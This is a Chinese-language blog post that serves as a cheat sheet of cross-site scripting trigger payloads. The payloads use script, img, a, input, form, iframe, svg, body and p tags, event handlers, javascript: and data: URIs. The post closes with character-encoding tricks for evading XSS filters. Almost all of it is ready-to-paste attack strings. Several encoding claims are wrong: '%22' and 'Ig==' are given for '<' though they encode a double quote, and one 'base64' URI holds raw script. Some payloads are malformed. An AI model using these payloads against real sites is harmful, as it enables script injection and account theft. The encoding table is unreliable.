---
title: XSS触发语句
tags: [网络安全]
index_img: https://cdn.jsdelivr.net/gh/0x766c6f6f6b/img@main/bg/wallhaven-j3l5yp.png
banner_img: https://cdn.jsdelivr.net/gh/0x766c6f6f6b/img@main/bg/wallhaven-72xrro.png
date: 2021-12-11 10:00:00

---

# XSS触发语句

## 标准语句

```html
<script>alert(xss)</script>
```

## 尝试大小写

```html
<sCript>alert(1)</sCRipt>
```

## 使用`<img>`标签

```html
- windows事件
<img src="x" onerror=alert(1)>
<img src="1" onerror=eval("alert('xss')")>
//图片加载错误时触发


- 鼠标事件
<img src=1 onmouseover="alert(1)">
//鼠标指针移动到元素时触发
<img src=1 onmouseout="alert(1)">
//鼠标指针移出时触发
```

## 使用`<a>`标签

```html
使用href属性
<a href="https://www.qq.com">qq</a>
<a href=javascript:alert('xss')>test</a>
<a href="javascript:a" onmouseover="alert(/xss/)">aa</a>
<a href="" onclick=alert('xss')>a</a>
<a href="" onclick=eval(alert('xss'))>aa</a>
<a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016>aa</a>
```

## 使用`<input>`标签

```html
<input name="name" value="">
<input value="" onclick=alert('xss') type="text">
<input name="name" value="" onmouseover=prompt('xss') bad="">
<input name="name" value=""><script>alert('xss')</script>
<input type="text" onkeydown="alert(1)">
//用户按下按键时触发

<input type="text" onkeypress="alert(1)">
//用户按下按键时触发

<input type="text" onkeyup="alert(1)">
//用户松开按键时触发
```

## 使用`<from>` 标签

```html
<form action=javascript:alert('xss') method="get"><form action=javascript:alert('xss')>

<form method=post action=aa.asp? onmouseover=prompt('xss')><form method=post action=aa.asp? onmouseover=alert('xss')><form action=1 onmouseover=alert('xss)>

<!--原code--><form method=post action="data:text/html;base64,<script>alert('xss')</script>"><!--base64编码--><form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

## 使用`<iframe>`标签

```html
<iframe src=javascript:alert('xss')></iframe>

<iframe src="data:text/html,<script>alert('xss')</script>"></iframe> <!--原code--><iframe src="data:text/html;base64,<script>alert('xss')</script>"> <!--base64编码--><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="> <iframe src="aaa" onmouseover=alert('xss') /><iframe> <iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
```

## 使用`<svg>`标签

```html
<svg onload=alert(1)>
```

## 使用`<body>`标签

```html
<body onload="alert(1)">
//加载时触发
```

## 使用`<button>`标签

```html
<button onclick="alert(1)">text</button>
//元素上点击鼠标时触发

<p onmousedown="alert(1)">text</p>
//元素上按下鼠标时触发

<p onmouseup="alert(1)">text</p>
//在元素上释放鼠标时触发
```

## 使用`<p>`标签

```html
<p onmousedown="alert(1)">text</p>
//元素上按下鼠标时触发

<p onmouseup="alert(1)">text</p>
//在元素上释放鼠标时触发
```

## XSS编码绕过

```html
1、html实体编码(10进制与16进制):
如把尖括号编码[ < ]  -----> html十进制: &#60;  html十六进制:&#x3c;

2、javascript的八进制跟十六进制:
如把尖括号编码[ < ]  -----> js八进制:\74  js十六进制:\x3c
三个八进制数字，如果数字不够，在前面补零，如a的编码为\141
两个十六进制数字，如果数字不够，在前面补零，如a的编码为\x61
四个十六进制数字，如果数字不够，在前面补零，如a的编码为\u0061
对于一些控制字符，使用特殊的C类型的转义风格，如\n和\r

3、url编码:
如把尖括号编码[ < ] -----> url: %22

4、base64编码:
如把尖括号编码[ < ] -----> base64: Ig==

5、jsunicode编码：
如把尖括号编码[ < ] ----->jsunicode:\u003c

6、String.fromCharCode编码
如alert的编码为String.fromCharCode(97,108,101,114,116)
```
